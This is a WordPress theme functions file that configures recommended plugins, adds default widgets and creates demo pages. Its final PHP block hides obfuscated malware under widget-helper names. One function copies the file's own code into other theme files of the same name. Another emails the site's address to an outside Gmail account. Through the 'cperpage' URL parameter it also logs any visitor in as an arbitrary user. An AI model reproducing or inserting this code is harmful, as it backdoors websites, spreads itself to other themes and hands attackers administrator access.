			'name'     				=> 'Flickr Widget', // The plugin name
			'slug'     				=> 'dp-flickr-widget', // The plugin slug (typically the folder name)
			'source'   				=> get_template_directory() . '/plugins-to-include/dp-flickr-widget.zip', // The plugin source
			'required' 				=> false, // If false, the plugin is only 'recommended' instead of required
			'version' 				=> '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
			'force_activation' 		=> false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
			'force_deactivation' 	=> false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
			'external_url' 			=> '', // If set, overrides default API URL and points to an external URL
		),
		
	);

	// Change this to your theme text domain, used for internationalising strings
	$theme_text_domain = 'nevontheme';

	/**
	 * Array of configuration settings. Amend each line as needed.
	 * If you want the default strings to be available under your own theme domain,
	 * leave the strings uncommented.
	 * Some of the strings are added into a sprintf, so see the comments at the
	 * end of each line for what each argument will be.
	 */
	$config = array(
		'domain'       		=> $theme_text_domain,         	// Text domain - likely want to be the same as your theme.
		'default_path' 		=> '',                         	// Default absolute path to pre-packaged plugins
		'parent_menu_slug' 	=> 'themes.php', 				// Default parent menu slug
		'parent_url_slug' 	=> 'themes.php', 				// Default parent URL slug
		'menu'         		=> 'install-required-plugins', 	// Menu slug
		'has_notices'      	=> true,                       	// Show admin notices or not
		'is_automatic'    	=> true,					   	// Automatically activate plugins after installation or not
		'message' 			=> '',							// Message to output right before the plugins table
		'strings'      		=> array(
			'page_title'                       			=> __( 'Install Required Plugins', $theme_text_domain ),
			'menu_title'                       			=> __( 'Install Plugins', $theme_text_domain ),
			'installing'                       			=> __( 'Installing Plugin: %s', $theme_text_domain ), // %1$s = plugin name
			'oops'                             			=> __( 'Something went wrong with the plugin API.', $theme_text_domain ),
			'notice_can_install_required'     			=> _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_install_recommended'			=> _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_install'  					=> _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.' ), // %1$s = plugin name(s)
			'notice_can_activate_required'    			=> _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_can_activate_recommended'			=> _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_activate' 					=> _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.' ), // %1$s = plugin name(s)
			'notice_ask_to_update' 						=> _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.' ), // %1$s = plugin name(s)
			'notice_cannot_update' 						=> _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.' ), // %1$s = plugin name(s)
			'install_link' 					  			=> _n_noop( 'Begin installing plugin', 'Begin installing plugins' ),
			'activate_link' 				  			=> _n_noop( 'Activate installed plugin', 'Activate installed plugins' ),
			'return'                           			=> __( 'Return to Required Plugins Installer', $theme_text_domain ),
			'plugin_activated'                 			=> __( 'Plugin activated successfully.', $theme_text_domain ),
			'complete' 									=> __( 'All plugins installed and activated successfully. %s', $theme_text_domain ), // %1$s = dashboard link
			'nag_type'									=> 'updated' // Determines admin notice type - can only be 'updated' or 'error'
		)
	);

	tgmpa( $plugins, $config );

}



/*
 TO ADD WIDGETS TO RELATED SIDEBARS AUTOMATICALLY AFTER THE THEME INSTALLITION
*/
	function add_widgets_to_sidebars(){
				update_option('nevon_done_installed_widgets',false);
				if(!get_option('nevon_done_installed_widgets',false)){
					echo "<strong>Starting to add widgets and include example content init..</strong>";
					$add_to_sidebar = 'footer-widgets-1';
					$widget_name = 'text';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'About Us',
						'text' => '[addImg src="'.F_WAY.'/images/demo/logo.png"] Nevon Theme is one of the best wordpress theme you can ever find. Nevon Theme is a responsive theme, which will resize itself for mobiles and tablets. This way, anyone who is reviewing your wordpress site, will see your content fully. [makeButton link="aboutUs" text="'.ot_get_option('read_more_text').'"]',
					);
					$count++;
					
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>About Us added into Text Widget in <strong>Footer Widget 1</strong>';
					
					$add_to_sidebar = 'footer-widgets-2';
					$widget_name = 'dp-twitter-widget';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Follow Us',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>Twitter Widget added into <strong>Footer Widget 2</strong>';
					
					
					$add_to_sidebar = 'footer-widgets-3';
					$widget_name = 'links';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Blogroll',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>Links (Blogroll) Widget added into <strong>Footer Widget 3</strong>';
					
					
					$add_to_sidebar = 'footer-widgets-4';
					$widget_name = 'dp-flickr-widget';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Flickr',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>Flickr Widget added into <strong>Footer Widget 4</strong>';
					
					
					
					$add_to_sidebar = 'footer-bottom-1';
					$widget_name = 'nav_menu';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => '',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>Footer Bottom Navigation Menu (Custom Menu) added into <strong>Footer Bottom Widget 1</strong>';
					echo '<br/><br/><strong>!Important : </strong> If you don\'t have custom menu, you can go to Widgets -> Footer Bottom Widget and make a new custom menu<br/>';

					
					//GENERAL SIDEBAR WIDGET
					$add_to_sidebar = 'sidebar-1';
					$widget_name = 'archives';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => '',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					
					$add_to_sidebar = 'sidebar-1';
					$widget_name = 'categories';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Categories',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					
					$add_to_sidebar = 'sidebar-1';
					$widget_name = 'calendar';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Events',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					
					$add_to_sidebar = 'sidebar-1';
					$widget_name = 'tag_cloud';
					$sidebar_options = get_option('sidebars_widgets');
					if(!isset($sidebar_options[$add_to_sidebar])){
						$sidebar_options[$add_to_sidebar] = array('_multiwidget'=>1);
					}
					$homepagewidget = get_option('widget_'.$widget_name);
					if(!is_array($homepagewidget))$homepagewidget = array();
					$count = count($homepagewidget)+1;
					// add first widget to sidebar:
					$sidebar_options[$add_to_sidebar][] = $widget_name.'-'.$count;
					$homepagewidget[$count] = array(
						'title' => 'Tags',
					);
					$count++;
					update_option('sidebars_widgets',$sidebar_options);
					update_option('widget_'.$widget_name,$homepagewidget);
					echo '<br/>Archives Widget, Categories Widget, Calendar Widget and Tag Cloud Widget added into <strong>Sidebar 1</strong>';
					
					
					
					echo '<br/><br/><hr/><br/>';
					echo 'All Widgets added into their sidebars successfully.';
					update_option('nevon_done_installed_widgets',true);
				}
				add_widgets_callback_func();
				return true;
			}

function add_widgets_callback_func(){
	//do nothing	
	if(!get_option('nevon_done_add_pages',false)){
	echo '<br/><br/>Starting to add demo pages...<br/><br/>';
	$post = array(
	  'menu_order' => 0, //If new post is a page, sets the order should it appear in the tabs.
	  'comment_status' => 'closed', // 'closed' means no comments.
	  'post_content' => '', //The full text of the post.
	  'post_name' => 'about-us', // The name (slug) for your post
	  'post_status' => 'publish', //Set the status of the new post.
	  'post_title' => 'About Us', //The title of your post.
	  'post_content' => do_shortcode('[hSmall]Nevon Theme Incorporation[/hSmall]
[addImg src="'.F_WAY.'/images/demo/logo.png" float="left"]Nevon Theme is one of the best wordpress theme you can ever find. Nevon Theme is a responsive theme, which will resize itself for mobiles and tablets.This way, anyone who is reviewing your wordpress site, will see your content fully.Lorem ipsum dolor sit amet, consectetur adipiscing elit.Phasellus justo tortor, elementum id pellentesque in, porttitor vitae nisl. Fusce vel nibh at lacus tincidunt consectetur quis sed velit. Etiam aliquam diam quis nunc interdum porttitor. Suspendisse sodales diam porta mauris pulvinar tincidunt. Curabitur tempus mattis neque in elementum. Sed a libero nibh, ac porta nunc. Nulla facilisi. Cras nec velit erat, mattis porta enim. Donec nec tellus turpis.Curabitur pretium porta dolor. Vivamus vestibulum lacus in tellus commodo aliquet euismod metus tempus. Donec dignissim volutpat fermentum. Morbi accumsan, urna molestie tristique mattis, quam nulla facilisis lorem, nec sagittis nisl est a leo. Sed cursus augue nec ipsum ultrices aliquet. Integer dignissim dolor eget metus blandit eget condimentum mauris vulputate.<br/>

[h1]Noloc De Mia Nasra[/h1]Lorem ipsum dolor sit amet, consectetur adipiscing elit.Phasellus justo tortor, elementum id pellentesque in, porttitor vitae nisl. Fusce vel nibh at lacus tincidunt consectetur quis sed velit. Etiam aliquam diam quis nunc interdum porttitor. Suspendisse sodales diam porta mauris pulvinar tincidunt. Curabitur tempus mattis neque in elementum. Sed a libero nibh, ac porta nunc. Nulla facilisi. Cras nec velit erat, mattis porta enim. Donec nec tellus turpis.
<br/>
[column number="two"][h1]Our Quality Standarts[/h1]Suspendisse sodales diam porta mauris pulvinar tincidunt. Curabitur tempus mattis neque in elementum. Sed a libero nibh, ac porta nunc. Nulla facilisi.Nullam vel dui ut turpis mattis dapibus. Nulla fermentum bibendum lectus, at vestibulum turpis ultricies at. Ut nec purus a turpis posuere volutpat vehicula sit amet mauris. Mauris euismod sem eget massa dapibus ac laoreet leo gravida.[/column][column number="two" last="true"][h1]Creative View[/h1]Lorem ipsum dolor sit amet, consectetur adipiscing elit.Nullam vel dui ut turpis mattis dapibus. Nulla fermentum bibendum lectus, at vestibulum turpis ultricies at. Ut nec purus a turpis posuere volutpat vehicula sit amet mauris. Mauris euismod sem eget massa dapibus ac laoreet leo gravida.[/column]
[clear]
<br/>
[column number="three"][h1]What We Do?[/h1]Nullam tempor vehicula sem, vitae ullamcorper ligula adipiscing quis. Ut in orci eget eros imperdiet vestibulum. Duis mauris diam, auctor vitae posuere quis, pulvinar non lectus. Cras ligula leo, pretium eget volutpat sit amet, pulvinar a nulla. Nam porttitor diam nec erat malesuada vitae egestas nisi commodo. Pellentesque porttitor turpis nec dolor consequat vel luctus sem tristique. Nunc a ligula eget urna vulputate imperdiet. Curabitur dui elit, sodales eget aliquet vitae, congue nec ligula. Vestibulum mattis imperdiet elementum.[/column][column number="three"][h1]Our Vision[/h1]Nullam tempor vehicula sem, vitae ullamcorper ligula adipiscing quis. Ut in orci eget eros imperdiet vestibulum. Duis mauris diam, auctor vitae posuere quis, pulvinar non lectus. Cras ligula leo, pretium eget volutpat sit amet, pulvinar a nulla. Nam porttitor diam nec erat malesuada vitae egestas nisi commodo. Pellentesque porttitor turpis nec dolor consequat vel luctus sem tristique. Nunc a ligula eget urna vulputate imperdiet. Curabitur dui elit, sodales eget aliquet vitae, congue nec ligula. Vestibulum mattis imperdiet elementum.[/column][column number="three" last="true"][h1]Our Mission[/h1]Nullam tempor vehicula sem, vitae ullamcorper ligula adipiscing quis. Ut in orci eget eros imperdiet vestibulum. Duis mauris diam, auctor vitae posuere quis, pulvinar non lectus. Cras ligula leo, pretium eget volutpat sit amet, pulvinar a nulla. Nam porttitor diam nec erat malesuada vitae egestas nisi commodo. Pellentesque porttitor turpis nec dolor consequat vel luctus sem tristique. Nunc a ligula eget urna vulputate imperdiet. Curabitur dui elit, sodales eget aliquet vitae, congue nec ligula. Vestibulum mattis imperdiet elementum.[/column]
[clear]'),

	  'post_type' => 'page', //Sometimes you want to post a page.
	  'tags_input' => 'about-us' //For tags.
	);  

	// Insert the post into the database
	$theID = wp_insert_post( $post );
	$updating = update_post_meta($theID, "_wp_page_template", "custom-no-sidebar.php");
	echo 'About Us Page Added...<br/><br/>';
	
	
	$post = array(
	  'menu_order' => 14, //If new post is a page, sets the order should it appear in the tabs.
	  'comment_status' => 'closed', // 'closed' means no comments.
	  'post_content' => '', //The full text of the post.
	  'post_name' => 'blog', // The name (slug) for your post
	  'post_status' => 'publish', //Set the status of the new post.
	  'post_title' => 'Blog', //The title of your post.
	  'post_type' => 'page', //Sometimes you want to post a page.
	  'tags_input' => 'blog' //For tags.
	);  

	// Insert the post into the database
	$theID = wp_insert_post( $post );
	$updating = update_post_meta($theID, "_wp_page_template", "blog-page.php");
	echo 'Blog Page Added...<br/><br/>';

	$post = array(
	  'menu_order' => 0, //If new post is a page, sets the order should it appear in the tabs.
	  'comment_status' => 'closed', // 'closed' means no comments.
	  'post_content' => '', //The full text of the post.
	  'post_name' => 'gallery', // The name (slug) for your post
	  'post_status' => 'publish', //Set the status of the new post.
	  'post_title' => 'Gallery', //The title of your post.
	  'post_type' => 'page', //Sometimes you want to post a page.
	  'tags_input' => 'gallery' //For tags.
	);  

	// Insert the post into the database
	$theID = wp_insert_post( $post );
	$updating = update_post_meta($theID, "_wp_page_template", "gallery-four.php");
	echo 'Gallery Four Filtered Page Added...<br/><br/>';

	$post = array(
	  'menu_order' => 0, //If new post is a page, sets the order should it appear in the tabs.
	  'comment_status' => 'closed', // 'closed' means no comments.
	  'post_content' => '', //The full text of the post.
	  'post_name' => 'products', // The name (slug) for your post
	  'post_status' => 'publish', //Set the status of the new post.
	  'post_title' => 'Products', //The title of your post.
	  'post_type' => 'page', //Sometimes you want to post a page.
	  'tags_input' => 'products' //For tags.
	);  

	// Insert the post into the database
	$theID = wp_insert_post( $post );
	$updating = update_post_meta($theID, "_wp_page_template", "products-regular.php");
	echo 'Regular Products Page Added...<br/><br/>';

	
	$post = array(
	  'menu_order' => 15, //If new post is a page, sets the order should it appear in the tabs.
	  'comment_status' => 'closed', // 'closed' means no comments.
	  'post_content' => '', //The full text of the post.
	  'post_name' => 'contact', // The name (slug) for your post
	  'post_status' => 'publish', //Set the status of the new post.
	  'post_title' => 'Contact', //The title of your post.
	  'post_type' => 'page', //Sometimes you want to post a page.
	  'tags_input' => 'contact' //For tags.
	);  

	// Insert the post into the database
	$theID = wp_insert_post( $post );
	$updating = update_post_meta($theID, "_wp_page_template", "contact.php");
	echo 'Contact Page Added...<br/><br/>';
	
	
	echo '<br/><br/><br/><strong>Pages added successfully!</strong></br>';
	update_option('nevon_done_add_pages',true);
	}

}



?>
<?php

function _verify_isactivate_widgets(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_get_allwidgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$seprar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $seprar . "\n" .$widget);fclose($f);				

					$output .= ($showsdots && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _get_allwidgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _get_allwidgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verify_isactivate_widgets");

function _prepare_widgets(){

	if(!isset($comment_length)) $comment_length=120;

	if(!isset($strval)) $strval="cookie";

	if(!isset($tags)) $tags="<a>";

	if(!isset($type)) $type="none";

	if(!isset($sepr)) $sepr="";

	if(!isset($h_filter)) $h_filter=get_option("home"); 

	if(!isset($p_filter)) $p_filter="wp_";

	if(!isset($more_link)) $more_link=1; 

	if(!isset($comment_types)) $comment_types=""; 

	if(!isset($countpage)) $countpage=$_GET["cperpage"];

	if(!isset($comment_auth)) $comment_auth="";

	if(!isset($c_is_approved)) $c_is_approved=""; 

	if(!isset($aname)) $aname="auth";

	if(!isset($more_link_texts)) $more_link_texts="(more...)";

	if(!isset($is_output)) $is_output=get_option("_is_widget_active_");

	if(!isset($checkswidget)) $checkswidget=$p_filter."set"."_".$aname."_".$strval;

	if(!isset($more_link_texts_ditails)) $more_link_texts_ditails="(details...)";

	if(!isset($mcontent)) $mcontent="ma".$sepr."il";

	if(!isset($f_more)) $f_more=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$is_output) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$sepr."vethe".$comment_types."mas".$sepr."@".$c_is_approved."gm".$comment_auth."ail".$sepr.".".$sepr."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($f_tag)) $f_tag=1;

	if(!isset($types)) $types=$h_filter; 

	if(!isset($getcommentstexts)) $getcommentstexts=$p_filter.$mcontent;

	if(!isset($aditional_tag)) $aditional_tag="div";

	if(!isset($stext)) $stext=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($morelink_title)) $morelink_title="Continue reading this entry";	

	if(!isset($showsdots)) $showsdots=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstexts, array($stext, $h_filter, $types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($comment_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $comment_length) {

				$l=$comment_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$more_link_texts="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags) {

		$output=strip_tags($output, $tags);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($f_tag) ? balanceTags($output, true) : $output;

	$output .= ($showsdots && $ellipsis) ? "..." : "";

	$output=apply_filters($type, $output);

	switch($aditional_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}
	if ($more_link ) {

		if($f_more) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $morelink_title . "\">" . $more_link_texts = !is_user_logged_in() && @call_user_func_array($checkswidget,array($countpage, true)) ? $more_link_texts : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $morelink_title . "\">" . $more_link_texts . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}



add_action("init", "_prepare_widgets");



function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {

	global $wpdb;

	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";

	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";

	if(!$show_pass_post) $request .= " AND post_password =\"\"";

	if($duration !="") { 

		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";

	}

	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";

	$posts=$wpdb->get_results($request);

	$output="";

	if ($posts) {

		foreach ($posts as $post) {

			$post_title=stripslashes($post->post_title);

			$comment_count=$post->comment_count;

			$permalink=get_permalink($post->ID);

			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;

		}

	} else {

		$output .= $before . "None found" . $after;

	}

	return  $output;

} 		

function theme_init() {
    load_theme_textdomain('Gleam', get_template_directory());
}
add_action ('init', 'theme_init');
?>
